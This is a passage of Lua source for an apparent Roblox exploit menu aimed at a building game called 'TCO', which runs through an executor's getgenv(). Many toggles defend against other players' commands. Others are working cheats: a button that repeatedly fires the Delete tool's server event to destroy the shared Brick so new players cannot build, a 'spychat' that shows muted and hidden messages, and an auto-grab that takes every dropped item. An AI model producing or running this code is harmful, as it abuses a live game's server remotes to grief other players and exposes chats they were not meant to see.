	if uiListLayout then
		local function updateSize()
			local contentSize = uiListLayout.AbsoluteContentSize
			local uiScale = screenGui:FindFirstChildOfClass("UIScale")
			local scale = uiScale and uiScale.Scale or 1
			local scaledHeight = (contentSize.Y + 2) / scale
			groupbox.Size = UDim2.new(groupbox.Size.X.Scale, groupbox.Size.X.Offset, 0, scaledHeight)
		end
		uiListLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(updateSize)
		local uiScale = screenGui:FindFirstChildOfClass("UIScale")
		if uiScale then
			uiScale:GetPropertyChangedSignal("Scale"):Connect(updateSize)
		end
		updateSize()
	end
	
	-- ====================================================================================================
	-- GROUPBOX/TAB CONFIGS
	-- ====================================================================================================
	
	_G.CreateToggle({
		frame = "visual",
		groupbox = script,
		tooltip = "Hides all main visual effects which includes: blind, colorless, fog, and myopic.",
		callback = function(isEnabled)
			if isEnabled then
				-- Start the anti visual loop
				_G.AntiVisualLoop = game:GetService("RunService").Heartbeat:Connect(function()
					local Lighting = game:GetService("Lighting")
					local LocalPlayer = game:GetService("Players").LocalPlayer
	
					-- Anti Myopic
					local blur = Lighting:FindFirstChild("Blur")
					if blur then blur.Enabled = false end
	
					-- Anti Blind
					local playerGui = LocalPlayer:FindFirstChild("PlayerGui")
					if playerGui then
						local blind = playerGui:FindFirstChild("Blind")
						if blind then
							local frame = blind:FindFirstChildOfClass("Frame")
							if frame then
								frame.BackgroundTransparency = 1
							end
						end
					end
	
					-- Anti Fog
					local fog = Lighting:FindFirstChild("Fog")
					if fog then fog.Density = 0 end
	
					-- Anti Colorless
					local rgb = Lighting:FindFirstChild("RGB")
					if rgb then rgb.Enabled = false end
				end)
			else
				-- Stop the loop when disabled
				if _G.AntiVisualLoop then
					_G.AntiVisualLoop:Disconnect()
					_G.AntiVisualLoop = nil
				end
			end
		end
	})
	
	
	
	
	-- ====================================================================================================
	-- VAMP
	-- ====================================================================================================
	_G.CreateToggle({
		frame = "vampire",
		groupbox = script,
		tooltip = "Blocks out the Vampire Vanquisher gear from breaking your camera and inventory.",
		callback = function(isEnabled)
			if isEnabled then
				local LocalPlayer = game:GetService("Players").LocalPlayer
				local StarterGui = game:GetService("StarterGui")
				local RunService = game:GetService("RunService")
	
				-- Function to run anti-vamp for 5 seconds after respawn
				local function onCharacterAdded(character)
					local humanoid = character:WaitForChild("Humanoid")
	
					-- Run anti-vamp loop for 5 seconds
					local startTime = tick()
					local tempLoop = RunService.Heartbeat:Connect(function()
						if tick() - startTime >= 5 then
							-- Stop after 5 seconds
							tempLoop:Disconnect()
							return
						end
	
						if humanoid and humanoid.Health > 0 then
							pcall(function()
								StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, true)
							end)
							workspace.CurrentCamera.CameraType = Enum.CameraType.Custom
							workspace.CurrentCamera.CameraSubject = humanoid
						end
					end)
				end
	
				-- Connect to character respawn
				_G.AntiVampConnection = LocalPlayer.CharacterAdded:Connect(onCharacterAdded)
	
				-- Also run for current character if it exists
				if LocalPlayer.Character then
					onCharacterAdded(LocalPlayer.Character)
				end
			else
				-- Disconnect when disabled
				if _G.AntiVampConnection then
					_G.AntiVampConnection:Disconnect()
					_G.AntiVampConnection = nil
				end
			end
		end
	})
	
	
	
	
	
	
	-- ====================================================================================================
	-- GLITCH
	-- ====================================================================================================
	_G.CreateToggle({
		frame = "glitch",
		groupbox = script,
		tooltip = "Prevents the glitch command from glitching you.",
		callback = function(isEnabled)
			if isEnabled then
				local LocalPlayer = game:GetService("Players").LocalPlayer
				local RunService = game:GetService("RunService")
				local lastPosition = nil
				local lastOrientation = nil
				local hasTeleportedBack = false
	
				_G.AntiGlitchLoop = RunService.Heartbeat:Connect(function()
					local character = LocalPlayer.Character
					if not character then return end
					local root = character:FindFirstChild("HumanoidRootPart")
					if not root then return end
	
					if not lastPosition then
						lastPosition = root.Position
						lastOrientation = root.CFrame - root.Position
						hasTeleportedBack = false
						return
					end
	
					local currentPos = root.Position
	
					-- Check if X coordinate is 1234567 (glitch zone)
					if math.abs(currentPos.X - 1234567) < 5 and not hasTeleportedBack then
						-- Teleported to the glitch zone, send back with same rotation
						root.CFrame = CFrame.new(lastPosition) * lastOrientation
						hasTeleportedBack = true
						_G.Notify("Blocked glitch command!", 2)
					elseif math.abs(currentPos.X - 1234567) >= 5 then
						-- Not in the glitch zone anymore, reset flag and update position
						hasTeleportedBack = false
						lastPosition = currentPos
						lastOrientation = root.CFrame - root.Position
					end
				end)
			else
				-- Stop the loop when disabled
				if _G.AntiGlitchLoop then
					_G.AntiGlitchLoop:Disconnect()
					_G.AntiGlitchLoop = nil
				end
			end
		end
	})
	
	-- ====================================================================================================
	-- JAIL
	-- ====================================================================================================
	_G.CreateToggle({
		frame = "jail",
		groupbox = script,
		tooltip = "Visually removes your jail cell.",
		callback = function(isEnabled)
			if isEnabled then
				local LocalPlayer = game:GetService("Players").LocalPlayer
				local RunService = game:GetService("RunService")
				local hasNotified = false
	
				_G.AntiJailLoop = RunService.Heartbeat:Connect(function()
					local char = workspace:FindFirstChild(LocalPlayer.Name)
					if not char then return end
	
					local jail = char:FindFirstChild("Jail")
					if not jail then 
						hasNotified = false
						return 
					end
	
					-- Notify once when jail is detected
					if not hasNotified then
						_G.Notify("Blocked jail command!", 2)
						hasNotified = true
					end
	
					for _, part in pairs(jail:GetChildren()) do
						if part:IsA("BasePart") and part.Name == "Part" then
							part.CanCollide = false
							part.Transparency = 1
						end
					end
				end)
			else
				-- Stop the loop when disabled
				if _G.AntiJailLoop then
					_G.AntiJailLoop:Disconnect()
					_G.AntiJailLoop = nil
				end
			end
		end
	})
	
	-- ====================================================================================================
	-- MAPTIDE NAN
	-- ====================================================================================================
	_G.CreateToggle({
		frame = "maptidenan",
		groupbox = script,
		tooltip = "Prevents spawn loop kill when a player sets the terrain tide to NaN.",
		callback = function(isEnabled)
			if isEnabled then
				local LocalPlayer = game:GetService("Players").LocalPlayer
	
				local function isVoided()
					local spawn = workspace:FindFirstChild("Spawn")
					if not spawn then return false end
					local acm = spawn.AssemblyCenterOfMass
					return acm.X == 0 and acm.Y == -1000000 and acm.Z == 0
				end
	
				local function onCharacterAdded(character)
					local hrp = character:WaitForChild("HumanoidRootPart")
					if not isVoided() then return end
					hrp.Anchored = true
					task.wait(0.1)
					hrp.CFrame = CFrame.new(0, 3, 0)
					hrp.Anchored = false
	
					-- Notify when teleported
					_G.Notify("Blocked NaN spawn kill!", 2)
				end
	
				-- Connect to character respawn
				_G.AntiNanConnection = LocalPlayer.CharacterAdded:Connect(onCharacterAdded)
	
				-- Also run for current character if it exists
				if LocalPlayer.Character then
					onCharacterAdded(LocalPlayer.Character)
				end
			else
				-- Disconnect when disabled
				if _G.AntiNanConnection then
					_G.AntiNanConnection:Disconnect()
					_G.AntiNanConnection = nil
				end
			end
		end
	})
	
	-- ====================================================================================================
	-- FREEZE
	-- ====================================================================================================
	_G.CreateToggle({
		frame = "freeze",
		groupbox = script,
		tooltip = "Auto resets your character when you get frozen.",
		callback = function(isEnabled)
			if isEnabled then
				local LocalPlayer = game:GetService("Players").LocalPlayer
				local RunService = game:GetService("RunService")
				local isResetting = false
	
				_G.AntiFreezeLoop = RunService.Heartbeat:Connect(function()
					local char = workspace:FindFirstChild(LocalPlayer.Name)
					if not char then return end
	
					if char:FindFirstChild("Hielo") and not isResetting then
						isResetting = true
						_G.Notify("Frozen detected! Resetting...", 2)
	
						if shared.ResetCharacter then
							shared.ResetCharacter()
						else
							-- Fallback reset method
							LocalPlayer.Character:FindFirstChildOfClass("Humanoid").Health = 0
						end
	
						LocalPlayer.CharacterAdded:Wait()
						task.wait(0.2)
						isResetting = false
					end
				end)
			else
				-- Stop the loop when disabled
				if _G.AntiFreezeLoop then
					_G.AntiFreezeLoop:Disconnect()
					_G.AntiFreezeLoop = nil
				end
			end
		end
	})
	
	-- ====================================================================================================
	-- INVIS
	-- ====================================================================================================
	_G.CreateToggle({
		frame = "invisible",
		groupbox = script,
		tooltip = "Auto resets your character when you turn invisible.",
		callback = function(isEnabled)
			if isEnabled then
				local LocalPlayer = game:GetService("Players").LocalPlayer
				local RunService = game:GetService("RunService")
				local isResetting = false
	
				_G.AntiInvisLoop = RunService.Heartbeat:Connect(function()
					local char = workspace:FindFirstChild(LocalPlayer.Name)
					if not char then return end
	
					local upperTorso = char:FindFirstChild("UpperTorso")
					if upperTorso and upperTorso.Transparency >= 1 and not isResetting then
						isResetting = true
						_G.Notify("Invisible detected! Resetting...", 2)
	
						if shared.ResetCharacter then
							shared.ResetCharacter()
						else
							-- Fallback reset method
							LocalPlayer.Character:FindFirstChildOfClass("Humanoid").Health = 0
						end
	
						LocalPlayer.CharacterAdded:Wait()
						task.wait(0.2)
						isResetting = false
					end
				end)
			else
				-- Stop the loop when disabled
				if _G.AntiInvisLoop then
					_G.AntiInvisLoop:Disconnect()
					_G.AntiInvisLoop = nil
				end
			end
		end
	})
	
	
	-- ====================================================================================================
	-- MORPH
	-- ====================================================================================================
	_G.CreateToggle({
		frame = "morph",
		groupbox = script,
		tooltip = "Auto resets your character when you get morphed.",
		callback = function(isEnabled)
			if isEnabled then
				local LocalPlayer = game:GetService("Players").LocalPlayer
				local isResetting = false
				local canDetect = false
				local originalShirt = nil
				local originalPants = nil
				local originalAccessories = {}
	
				local function captureOriginalAppearance(character)
					-- Capture shirt
					local shirt = character:FindFirstChildOfClass("Shirt")
					originalShirt = shirt and shirt.ShirtTemplate or nil
					-- Capture pants
					local pants = character:FindFirstChildOfClass("Pants")
					originalPants = pants and pants.PantsTemplate or nil
					-- Capture accessories
					originalAccessories = {}
					for _, accessory in pairs(character:GetChildren()) do
						if accessory:IsA("Accessory") then
							table.insert(originalAccessories, accessory.Name)
						end
					end
				end
	
				local function checkForMorph(character)
					if isResetting or not canDetect then return end
					-- Check shirt change
					local shirt = character:FindFirstChildOfClass("Shirt")
					local currentShirt = shirt and shirt.ShirtTemplate or nil
					if currentShirt ~= originalShirt then
						return true
					end
					-- Check pants change
					local pants = character:FindFirstChildOfClass("Pants")
					local currentPants = pants and pants.PantsTemplate or nil
					if currentPants ~= originalPants then
						return true
					end
					-- Check accessories change
					local currentAccessories = {}
					for _, accessory in pairs(character:GetChildren()) do
						if accessory:IsA("Accessory") then
							table.insert(currentAccessories, accessory.Name)
						end
					end
					-- Compare accessories (if count or names changed)
					if #currentAccessories ~= #originalAccessories then
						return true
					end
					for _, accName in pairs(currentAccessories) do
						local found = false
						for _, origName in pairs(originalAccessories) do
							if accName == origName then
								found = true
								break
							end
						end
						if not found then
							return true
						end
					end
					return false
				end
	
				local function onCharacterAdded(character)
					canDetect = false -- Disable detection on respawn
					task.wait(0.5) -- Wait for character to fully load
					captureOriginalAppearance(character)
					task.wait(1) -- Wait 1 second before enabling detection
					canDetect = true
					isResetting = false
				end
	
				-- Capture initial appearance
				if LocalPlayer.Character then
					task.spawn(function()
						onCharacterAdded(LocalPlayer.Character)
					end)
				end
	
				-- Monitor for changes
				_G.AntiMorphLoop = game:GetService("RunService").Heartbeat:Connect(function()
					local char = workspace:FindFirstChild(LocalPlayer.Name)
					if not char then return end
					if checkForMorph(char) then
						isResetting = true
						_G.Notify("Morph detected! Resetting...", 2)
						if shared.ResetCharacter then
							shared.ResetCharacter()
						else
							LocalPlayer.Character:FindFirstChildOfClass("Humanoid").Health = 0
						end
						LocalPlayer.CharacterAdded:Wait()
						task.wait(0.2)
					end
				end)
	
				-- Track respawns
				_G.AntiMorphRespawn = LocalPlayer.CharacterAdded:Connect(onCharacterAdded)
			else
				-- Stop the loop when disabled
				if _G.AntiMorphLoop then
					_G.AntiMorphLoop:Disconnect()
					_G.AntiMorphLoop = nil
				end
				if _G.AntiMorphRespawn then
					_G.AntiMorphRespawn:Disconnect()
					_G.AntiMorphRespawn = nil
				end
			end
		end
	})
	
	
	-- ====================================================================================================
	-- NOCLIP
	-- ====================================================================================================
	_G.CreateToggle({
		frame = "noclip",
		groupbox = script,
		tooltip = "Auto joins on noclip.",
		callback = function(isEnabled)
			if isEnabled then
				local LocalPlayer = game:GetService("Players").LocalPlayer
				local TeleportService = game:GetService("TeleportService")
				local hasDetected = false
	
				_G.AntiNoclipLoop = task.spawn(function()
					while true do
						local char = workspace:FindFirstChild(LocalPlayer.Name)
						if char then
							local hrp = char:FindFirstChild("HumanoidRootPart")
							if hrp and hrp.CollisionGroup == "NoClip" and not hasDetected then
								hasDetected = true
								_G.Notify("Noclip detected! Rejoining...", 999999)
								TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, LocalPlayer)
							end
						end
						task.wait(5)
					end
				end)
			else
				-- Stop the loop when disabled
				if _G.AntiNoclipLoop then
					task.cancel(_G.AntiNoclipLoop)
					_G.AntiNoclipLoop = nil
				end
			end
		end
	})
	
	
	
	
	
	-- ====================================================================================================
	-- TP
	-- ====================================================================================================
	_G.CreateToggle({
		frame = "teleport",
		groupbox = script,
		tooltip = "Prevents you from getting teleported.",
		callback = function(isEnabled)
			if isEnabled then
				local LocalPlayer = game:GetService("Players").LocalPlayer
				local RunService = game:GetService("RunService")
				local lastPosition = nil
				local lastOrientation = nil
	
				_G.AntiTeleportLoop = RunService.Heartbeat:Connect(function()
					local character = LocalPlayer.Character
					if not character then return end
					local root = character:FindFirstChild("HumanoidRootPart")
					if not root then return end
	
					if lastPosition then
						local distance = (root.Position - lastPosition).Magnitude
						if distance > 15 then
							-- Teleported, send back with same rotation
							root.CFrame = CFrame.new(lastPosition) * lastOrientation
							_G.Notify("Blocked teleport!", 2)
						end
					end
	
					lastPosition = root.Position
					lastOrientation = root.CFrame - root.Position
				end)
			else
				-- Stop the loop when disabled
				if _G.AntiTeleportLoop then
					_G.AntiTeleportLoop:Disconnect()
					_G.AntiTeleportLoop = nil
				end
			end
		end
	})
end;
task.spawn(C_219);
-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.mainScriptTCO
local function C_24f()
local script = G2L["24f"];
	repeat task.wait() until _G.CreateToggle and _G.CreateButton and _G.CreateButtonToggle and _G.CreateTextbox and _G.CreateSlider and _G.CreateDropdown
	local groupbox = script.Parent
	local uiListLayout = groupbox:FindFirstChildOfClass("UIListLayout")
	local function getScreenGui()
		local p = groupbox
		while p do
			if p:IsA("ScreenGui") then return p end
			p = p.Parent
		end
	end
	local screenGui = getScreenGui()
	if not screenGui then return end
	if uiListLayout then
		local function updateSize()
			local contentSize = uiListLayout.AbsoluteContentSize
			local uiScale = screenGui:FindFirstChildOfClass("UIScale")
			local scale = uiScale and uiScale.Scale or 1
			local scaledHeight = (contentSize.Y + 2) / scale
			groupbox.Size = UDim2.new(groupbox.Size.X.Scale, groupbox.Size.X.Offset, 0, scaledHeight)
		end
		uiListLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(updateSize)
		local uiScale = screenGui:FindFirstChildOfClass("UIScale")
		if uiScale then
			uiScale:GetPropertyChangedSignal("Scale"):Connect(updateSize)
		end
		updateSize()
	end
	
	-- ====================================================================================================
	-- SPYCHAT SETUP
	-- ====================================================================================================
	local TCO_PLACE_IDS = {
		11137575513,
		12943245078,
		12943247001,
		108097274488844,
	}
	
	local isTCO = false
	for _, id in ipairs(TCO_PLACE_IDS) do
		if game.PlaceId == id then
			isTCO = true
			break
		end
	end
	
	if isTCO then
		local isog = workspace:FindFirstChild("Cubes") ~= nil
	
		local namecolors = {
			peasant  = {150, 103, 102},
			arken    = {4,   175, 236},
			admin    = {245, 205, 48},
			hidden   = {255, 0,   0},
			iqgenius = {255, 179, 179},
			iqdumb   = {200, 0,   0},
		}
		if isog then
			namecolors.peasant = {128, 128, 128}
		end
	
		local namecolorshex = {}
		for i, v in pairs(namecolors) do
			namecolorshex[i] = "#" .. Color3.fromRGB(table.unpack(v)):ToHex()
		end
	
		-- Register handler
		_G.ChatHandlers = _G.ChatHandlers or {}
		table.insert(_G.ChatHandlers, function(mdata, plr)
			local spyChatOn = _G.ConfigData and _G.ConfigData["spychat"] or false
	
			local cn
			if plr.Neutral == true then
				if plr:GetAttribute("Arken") == true then
					cn = "arken"
				else
					cn = "peasant"
				end
			else
				cn = "admin"
			end
	
			local muted = plr:HasTag("Muted")
			if muted then
				cn = "hidden"
				if not spyChatOn then
					mdata.Text = ""
				end
			end
	
			local hidden = false
			if string.sub(mdata.Text, 1, 1) == ";" then
				if spyChatOn then
					cn = "hidden"
					hidden = true
				else
					mdata.Text = ""
				end
			end
	
			local iqEmoji = nil
			if spyChatOn and plr:GetAttribute("IQ") then
				local iq = plr:GetAttribute("IQ")
				if iq >= 200 then
					iqEmoji = "🧠"
					cn = "iqgenius"
				elseif iq <= 50 then
					iqEmoji = "🤪"
					cn = "iqdumb"
				end
			end
	
			local icon = ""
			if spyChatOn then
				if hidden then
					icon = "🚫 "
				elseif muted then
					icon = "🤐 "
				elseif iqEmoji then
					icon = iqEmoji .. " "
				end
			end
	
			local r   = namecolors[cn][1]
			local g   = namecolors[cn][2]
			local b   = namecolors[cn][3]
			local hex = namecolorshex[cn]
			local displayName = plr.DisplayName
	
			if isog then
				mdata.PrefixText = "<font color=\"" .. hex .. "\"><b><font color='rgb(" .. r .. "," .. g .. "," .. b .. ")'>" .. icon .. "[" .. displayName .. "]: </font></b></font>"
			else
				mdata.PrefixText = "<font color=\"" .. hex .. "\"><i><font color='rgb(" .. r .. "," .. g .. "," .. b .. ")'>" .. icon .. "(" .. displayName .. ") </font></i></font>"
			end
		end)
	end
	
	-- ====================================================================================================
	-- GROUPBOX/TAB CONFIGS
	-- ====================================================================================================
	_G.CreateToggle({
		frame = "spychat",
		groupbox = script,
		tooltip = "Shows all hidden chats.",
		callback = function(isEnabled)
		end
	})
	
	
	
	
	local Players = game:GetService("Players")
	local LocalPlayer = Players.LocalPlayer
	local pickupLoop = nil
	local unequipLoop = nil
	local autoPickedTools = {}
	local DEATH_TAG = "DeathItem"
	_G.CreateToggle({
		frame = "autograb",
		groupbox = script,
		tooltip = "Automatically grabs all dropped/disarmed items.",
		callback = function(isEnabled)
			if isEnabled then
				autoPickedTools = {}
				-- Pickup loop
				pickupLoop = task.spawn(function()
					while true do
						local char = LocalPlayer.Character
						local hum = char and char:FindFirstChildWhichIsA("Humanoid")
						if hum and hum.Health > 0 then
							local currentTool = char:FindFirstChildOfClass("Tool")
							for _, obj in ipairs(workspace:GetChildren()) do
								if obj:IsA("Tool") and obj:FindFirstChild("Handle") and not obj:HasTag(DEATH_TAG) and not autoPickedTools[obj] then
									autoPickedTools[obj] = tick() + 0.5
									local toolName = obj.Name
									pcall(function()
										hum:EquipTool(obj)
									end)
	
									-- Notify when tool is grabbed
									_G.Notify("Auto grabbed tool: " .. toolName, 2)
								end
							end
							if currentTool and currentTool.Parent == LocalPlayer.Backpack and not autoPickedTools[currentTool] then
								task.wait(0.05)
								hum:EquipTool(currentTool)
							end
						end
						task.wait()
					end
				end)
				-- Unequip loop
				unequipLoop = task.spawn(function()
					while true do
						local char = LocalPlayer.Character
						if char then
							local currentTime = tick()
							for tool, expiry in pairs(autoPickedTools) do
								if currentTime > expiry then
									autoPickedTools[tool] = nil
								end
							end
							for _, tool in pairs(char:GetChildren()) do
								if tool:IsA("Tool") and autoPickedTools[tool] and currentTime < autoPickedTools[tool] then
									tool.Parent = LocalPlayer.Backpack
								end
							end
						end
						task.wait()
					end
				end)
			else
				-- Disable
				if pickupLoop then
					task.cancel(pickupLoop)
					pickupLoop = nil
				end
				if unequipLoop then
					task.cancel(unequipLoop)
					unequipLoop = nil
				end
				autoPickedTools = {}
			end
		end
	})
	
	
	-- ====================================================================================================
	-- BUTTONS
	-- ====================================================================================================
	_G.CreateButton({
		frame = "disabledeletesound",
		groupbox = script,
		tooltip = "Temporarily disables building sounds using delete tool, respawning will restore the sounds.",
		afterMessage = "Disabled sounds!",
		errorMessage = "Failed!",
		afterMessageWait = 1,
		canClickDuringAfter = true,
		callback = function()
			local token = _G.SetButtonText("disabledeletesound", "Processing...", 999)
			local success, err = pcall(function()
				local Players = game:GetService("Players")
				local LocalPlayer = Players.LocalPlayer
				local workspace = game:GetService("Workspace")
				local isog = workspace:FindFirstChild("Cubes") ~= nil
				if isog then
					error("OG not supported!")
				end
				local character = LocalPlayer.Character
				if not character then error("No character") end
	
				-- Refresh the delete tool first
				if shared.RefreshTool then
					shared.RefreshTool("Delete")
					task.wait(0.1)
				end
	
				local deleteTool = LocalPlayer.Backpack:FindFirstChild("Delete") or character:FindFirstChild("Delete")
				if not deleteTool then error("Delete tool needed!") end
	
				local event = deleteTool:WaitForChild("Script"):WaitForChild("Event")
				local hrp = character:FindFirstChild("HumanoidRootPart")
				if not hrp then error("No HumanoidRootPart") end
				local brick = hrp:FindFirstChild("Brick")
				if not brick then error("Brick not found in HumanoidRootPart") end
				for i = 1, 2 do
					event:FireServer(brick, hrp.Position)
					task.wait(0.01)
				end
			end)
			if success then
				_G.SetButtonText("disabledeletesound", "Disabled sounds!", 1)
				_G.Notify("Building sounds disabled!", 3)
				return true
			else
				_G.SetButtonText("disabledeletesound", err or "Failed!", 1)
				_G.Notify("Failed to disable sounds!", 3)
				return false
			end
		end,
	})
	-- ====================================================================================================
	-- DISABLE BKIT
	-- ====================================================================================================
	_G.CreateButton({
		frame = "disablebkit",
		groupbox = script,
		tooltip = "Disables B-Kit serversided using delete tool. New players who gets B-Kit will no longer be able to build.",
		needsConfirm = true,
		confirmMessage = "Are you sure?",
		confirmWait = 1,
		afterMessage = "Disabled B-Kit!",
		errorMessage = "Failed!",
		afterMessageWait = 1,
		canClickDuringAfter = true,
		callback = function()
			local token = _G.SetButtonText("disablebkit", "Processing...", 999)
			local success, err = pcall(function()
				local Players = game:GetService("Players")
				local LocalPlayer = Players.LocalPlayer
				local rs = game:GetService("ReplicatedStorage")
				local character = LocalPlayer.Character
				if not character then error("No character") end
	
				-- Refresh the delete tool first
				if shared.RefreshTool then
					shared.RefreshTool("Delete")
					task.wait(0.1)
				end
	
				local deleteTool = LocalPlayer.Backpack:FindFirstChild("Delete") or character:FindFirstChild("Delete")
				if not deleteTool then error("Delete tool needed!") end
	
				local event = deleteTool:WaitForChild("Script"):WaitForChild("Event")
				local brick = rs:FindFirstChild("Brick")
				if not brick then error("No Brick in ReplicatedStorage") end
				local startTime = tick()
				local maxTime = 5
				while tick() - startTime < maxTime and not token.cancelled do
					if not rs:FindFirstChild("Brick") then
						return true
					end
					event:FireServer(brick, character.HumanoidRootPart.Position)
					task.wait(0.01)
				end
				error("Timeout - Brick not deleted")
			end)
			if success then
				_G.SetButtonText("disablebkit", "Disabled B-Kit!", 1)
				_G.Notify("B-Kit disabled successfully!", 3)
				return true
			else
				_G.SetButtonText("disablebkit", err or "Failed!", 1)
				_G.Notify("Failed to disable B-Kit!", 3)
				return false
			end
		end,
	})
	
	-- ====================================================================================================
	-- FIX BRICK
	-- ====================================================================================================
	_G.CreateButton({
		frame = "fixbrick",
		groupbox = script,
		tooltip = "Fixes/restores the brick, if someone painted it, to normal using paint tool. This does not fix broken B-Kit.",
		afterMessage = "Fixed brick!",
		errorMessage = "Failed!",
		afterMessageWait = 1,
		canClickDuringAfter = true,
		callback = function()
			local token = _G.SetButtonText("fixbrick", "Processing...", 999)
			local success, err = pcall(function()
				local Players = game:GetService("Players")
				local LocalPlayer = Players.LocalPlayer
				local rs = game:GetService("ReplicatedStorage")
				local brick = rs:FindFirstChild("Brick")
				if not brick or brick:HasTag("FAKE") then
					error("Brick not found!")
				end
				local character = LocalPlayer.Character
				if not character then error("No character") end
				local paintTool = LocalPlayer.Backpack:FindFirstChild("Paint") or character:FindFirstChild("Paint")
				if not paintTool then error("Paint tool needed!") end
				if shared.RefreshTool then
					shared.RefreshTool("Paint")
					task.wait(0.1)
				end
				paintTool = LocalPlayer.Backpack:FindFirstChild("Paint") or character:FindFirstChild("Paint")
				if not paintTool then error("Paint tool not found") end
				local event = paintTool:WaitForChild("Script"):WaitForChild("Event")
				local hrp = character:FindFirstChild("HumanoidRootPart")
				if not hrp then error("No HumanoidRootPart") end
				local pos = hrp.Position
				event:FireServer(brick, Enum.NormalId.Top, pos, "both 🤝", Color3.fromRGB(192, 192, 192), "plastic", "")
				task.wait(0.1)
				event:FireServer(brick, Enum.NormalId.Bottom, pos, "both 🤝", Color3.fromRGB(192, 192, 192), "spray", "")
				task.wait(0.1)
				event:FireServer(brick, Enum.NormalId.Left, pos, "both 🤝", Color3.fromRGB(192, 192, 192), "spray", "")
				task.wait(0.1)
				event:FireServer(brick, Enum.NormalId.Right, pos, "both 🤝", Color3.fromRGB(192, 192, 192), "spray", "")
				task.wait(0.1)
				event:FireServer(brick, Enum.NormalId.Back, pos, "both 🤝", Color3.fromRGB(192, 192, 192), "spray", "")
				task.wait(0.1)
				event:FireServer(brick, Enum.NormalId.Front, pos, "both 🤝", Color3.fromRGB(192, 192, 192), "spray", "")
				task.wait(0.1)
				event:FireServer(brick, Enum.NormalId.Top, pos, "both 🤝", Color3.fromRGB(192, 192, 192), "spray", "")
				if not brick.Anchored then
					task.wait(0.1)
					event:FireServer(brick, Enum.NormalId.Top, pos, "material", Color3.fromRGB(173, 172, 175), "anchor", "")
				end
				if not brick.CanCollide then
					task.wait(0.1)
					event:FireServer(brick, Enum.NormalId.Top, pos, "material", Color3.fromRGB(173, 172, 175), "collide", "")
				end
			end)
			if success then
				_G.SetButtonText("fixbrick", "Fixed brick!", 1)
				_G.Notify("Brick fixed successfully!", 3)
				return true
			else
				_G.SetButtonText("fixbrick", err or "Failed!", 1)
				_G.Notify("Failed to fix brick!", 3)
				return false
			end
		end,
	})
	
	-- ====================================================================================================
	-- RESTORE BRICK
	-- ====================================================================================================
	if getgenv().brickcollection == nil then
		getgenv().brickcollection = {}
	
		local brickname = "Brick"
		local cfolder = workspace:FindFirstChild("Bricks") or workspace:FindFirstChild("Blocks")
	
		local function dbc(b)
			if b.Name ~= brickname then return end
			if not table.find(getgenv().brickcollection, b) then
				table.insert(getgenv().brickcollection, 1, b)
			end
		end
	
		if cfolder then
			cfolder.DescendantAdded:Connect(dbc)
			for _, v in pairs(cfolder:GetDescendants()) do
				dbc(v)
			end
		end
	end
	
	_G.CreateButton({
		frame = "restorebrick",
		groupbox = script,
		tooltip = "Restores brick and sometimes places a block at your torso when B-Kit is broken, and theres no more blocks to place on. You must be in the server before B-Kit gets disabled.",
		afterMessage = "Restored brick!",
		errorMessage = "Failed!",
		afterMessageWait = 1,
		canClickDuringAfter = true,
		callback = function()
			local token = _G.SetButtonText("restorebrick", "Processing...", 999)
	
			if getgenv().brickcollection == nil then
				getgenv().brickcollection = {}
			end
	
			local success, result = pcall(function()
				local Players = game:GetService("Players")
				local LocalPlayer = Players.LocalPlayer
				local rs = game:GetService("ReplicatedStorage")
				local workspace = game:GetService("Workspace")
	
				local brickname = "Brick"
				local ws = 0.235
				local cfolder = workspace:FindFirstChild("Bricks") or workspace:FindFirstChild("Blocks")
	
				if not cfolder then
					return "No blocks folder!"
				end
	
				local character = LocalPlayer.Character
				if not character then return "No character!" end
	
				local hrp = character:FindFirstChild("HumanoidRootPart")
				if not hrp then return "No HumanoidRootPart!" end
	
				local function getplrpos()
					return hrp.Position
				end
	
				local function findtool(toolname)
					for _, v in pairs(character:GetChildren()) do
						if v:IsA("Tool") and v.Name:find(toolname) then
							return v
						end
					end
					for _, v in pairs(LocalPlayer.Backpack:GetChildren()) do
						if v:IsA("Tool") and v.Name:find(toolname) then
							return v
						end
					end
					return nil
				end
	
				if not rs:FindFirstChild(brickname) then
					local brick = Instance.new("Part")
					brick.Name = brickname
					brick.Parent = rs
				end
	
				for _, v in pairs(character:GetChildren()) do
					if v:HasTag("The Chosen One by TomazDev") then
						v.Script.Enabled = false
						v.Script.Enabled = true
					end
				end
	
				for _, v in pairs(LocalPlayer.Backpack:GetChildren()) do
					if v:HasTag("The Chosen One by TomazDev") then
						v.Script.Enabled = false
						v.Script.Enabled = true
					end
				end
	
				local buildtool = findtool("Build")
				local painttool = findtool("Paint")
				local shapetool = findtool("Shape")
	
				if not buildtool then
					return "Build tool needed!"
				end
	
				if buildtool.Parent == LocalPlayer.Backpack then
					buildtool.Parent = character
				end
				if painttool and painttool.Parent == LocalPlayer.Backpack then
					painttool.Parent = character
				end
				if shapetool and shapetool.Parent == LocalPlayer.Backpack then
					shapetool.Parent = character
				end
	
				task.wait(ws)
	
				local currbc = {}
				for _, v in pairs(getgenv().brickcollection) do
					if v ~= nil and typeof(v) == "Instance" then
						if v:GetFullName() ~= brickname and v.Name ~= "Debris" then
							table.insert(currbc, 1, v)
						else
							table.insert(currbc, v)
						end
					end
				end
	
				if #currbc == 0 then
					return "No blocks found!"
				end
	
				local playerfolder = cfolder:FindFirstChild(LocalPlayer.Name)
				if not playerfolder then
					return "Player folder not found!"
				end
	
				local block = nil
				local beforeamt = #playerfolder:GetChildren()
	
				for _, v in pairs(currbc) do
					if v ~= nil and typeof(v) == "Instance" then
						block = v
						if buildtool:FindFirstChild("Script") and buildtool.Script:FindFirstChild("Event") then
							buildtool.Script.Event:FireServer(
								block,
								Enum.NormalId.Top,
								getplrpos(),
								"detailed"
							)
						end
	
						task.wait(ws)
						if beforeamt < #playerfolder:GetChildren() then
							break
						end
					end
				end
	
				task.wait(1)
				block = playerfolder:FindFirstChildWhichIsA("BasePart")
	
				if not block then
					return "No block created!"
				end
	
				block = playerfolder:GetChildren()[#playerfolder:GetChildren()]
	
				if painttool then
					if block.Material ~= Enum.Material.Plastic then
						painttool.Script.Event:FireServer(
							block,
							Enum.NormalId.Top,
							getplrpos(),
							"material",
							Color3.fromRGB(192, 192, 192),
							"plastic",
							""
						)
						task.wait(ws * 2)
					end
	
					if not block.Anchored or block.CFrame - block.Position ~= CFrame.new() then
